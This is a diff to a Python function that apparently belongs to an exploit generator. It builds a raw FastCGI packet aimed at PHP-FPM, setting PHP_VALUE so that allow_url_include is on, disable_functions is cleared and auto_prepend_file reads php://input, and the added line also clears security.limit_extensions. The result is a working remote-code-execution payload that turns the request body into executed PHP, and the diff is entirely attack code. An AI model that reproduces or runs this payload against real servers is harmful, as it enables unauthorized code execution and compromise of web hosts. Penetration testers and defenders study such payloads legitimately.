@@ -12,7 +12,7 @@ def FastCGI():
 
     data = "\x0f\x10SERVER_SOFTWAREgo / fcgiclient \x0b\tREMOTE_ADDR127.0.0.1\x0f\x08SERVER_PROTOCOLHTTP/1.1\x0e" + chr(len(str(length)))
     data += "CONTENT_LENGTH" + str(length) +  "\x0e\x04REQUEST_METHODPOST\tKPHP_VALUEallow_url_include = On\n"
-    data += "disable_functions = \nauto_prepend_file = php://input\x0f" + chr(len(filename)) +"SCRIPT_FILENAME" + filename + "\r\x01DOCUMENT_ROOT/"
+    data += "disable_functions = \nsecurity.limit_extensions = \nauto_prepend_file = php://input\x0f" + chr(len(filename)) +"SCRIPT_FILENAME" + filename + "\r\x01DOCUMENT_ROOT/"
 
     temp1 = chr(len(data) / 256)
     temp2 = chr(len(data) % 256)
